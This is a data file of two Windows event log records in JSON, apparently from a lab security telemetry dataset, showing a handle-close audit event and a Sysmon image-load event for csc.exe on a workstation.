{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x16c\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.465Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820565,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0x16c","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"ImageLoaded":"C:\\Windows\\System32\\ole32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=C7BA959197D19EC7C8F7707B0D8BBE77E80A9DBE,MD5=D3BAA65CBCA982E5835AE33C2C7513E9,SHA256=56D18A442AD599B04C29D98AB9E2A1983959FB74AB27D4392667A975310754E8,IMPHASH=C908A257ACFAF3BDE15426EE5244D1EB","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft OLE for Windows","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1082 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.465Z","port":64545,"RecordNumber":3399423,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"OLE32.DLL","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
